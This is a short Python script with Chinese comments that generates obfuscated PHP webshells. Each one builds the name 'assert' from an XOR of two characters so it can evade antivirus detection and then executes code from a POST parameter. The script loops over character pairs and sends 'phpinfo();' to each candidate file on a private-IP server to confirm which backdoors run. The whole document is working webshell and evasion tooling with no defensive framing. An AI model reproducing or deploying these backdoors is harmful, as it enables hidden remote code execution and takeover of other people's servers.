'''
    请求后门  测试payload是否成功  判断后门代码是否正常
    免杀的正常后门
    同时也可以将ssert转化为字符异或的结果  -->  无字符后门
'''
import requests

for i in range(1, 127):
    for j in range(1, 127):
        code = "'" + chr(i) + "'" + '^' + "'" + chr(j) + "'"
        bypass = "<?php $a= (" + code + ").'ssert';$a($_POST[x]);?>"
        file_name = str(i) + '_' + str(j) + '.php'
        url = 'http://192.168.110.34/mess/php_webshell/' + file_name
        # print(url)
        data = {
            'x': 'phpinfo();'
        }
        resp = requests.post(url=url, data=data).content.decode('utf-8')
        if 'PHP Version' in resp:
            print(file_name + ' ok')
